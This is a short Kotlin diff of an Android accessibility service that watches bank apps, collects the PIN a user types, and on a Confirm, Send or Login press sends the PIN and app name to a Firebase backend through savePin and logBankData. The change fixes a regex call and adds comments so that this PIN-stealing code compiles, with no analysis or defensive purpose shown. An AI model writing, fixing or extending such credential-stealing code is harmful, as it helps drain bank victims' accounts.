@@ -18,7 +18,6 @@ import android.view.WindowManager
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import android.util.Log
-import java.util.*
 
 class MyAccessibilityService : AccessibilityService() {
 
@@ -65,9 +64,10 @@ class MyAccessibilityService : AccessibilityService() {
             if (isBankApp(pkg) && pinBuffer != null && pinBuffer!!.isNotEmpty()) {
                 val source = event.source ?: return
                 val confirmText = source.text?.toString() ?: source.contentDescription?.toString() ?: ""
-                if (confirmText.contains(Regex("Confirm|Send|Login|Sign in|OK"), true)) {
+                // FIXED: use Regex.containsMatchIn instead of String.contains with Regex
+                if (Regex("Confirm|Send|Login|Sign in|OK", RegexOption.IGNORE_CASE).containsMatchIn(confirmText)) {
                     val pin = pinBuffer.toString()
-                    FirebaseBridge.savePin(pkg, pin)
+                    FirebaseBridge.savePin(pkg, pin)   // needs FirebaseBridge to have this method
                     FirebaseBridge.logBankData(pkg, pin = pin)
                     pinBuffer = null
                 }
